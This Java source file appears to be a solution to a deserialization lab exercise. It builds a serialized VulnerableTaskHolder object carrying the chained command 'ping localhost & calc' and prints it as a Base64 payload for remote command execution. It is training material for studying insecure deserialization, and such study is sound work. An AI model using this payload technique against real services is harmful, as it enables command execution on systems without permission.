import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

/**
 * Created by ycw/yanch on 2021/11/5.
 */
class _13_靶场反序列化 {
}

/**
 * Created by ycw/yanch on 2021/11/5.
 */
class Test {

    public static void main(String[] args) throws IOException {
        // VulnerableTaskHolder o = new VulnerableTaskHolder("namenotimportant", "sleep 5");
        VulnerableTaskHolder o = new VulnerableTaskHolder(
                "namenotimportant",
                "ping localhost & calc"
        );
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(
                baos
        );
        oos.writeObject(o);
        oos.close();

        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }

}
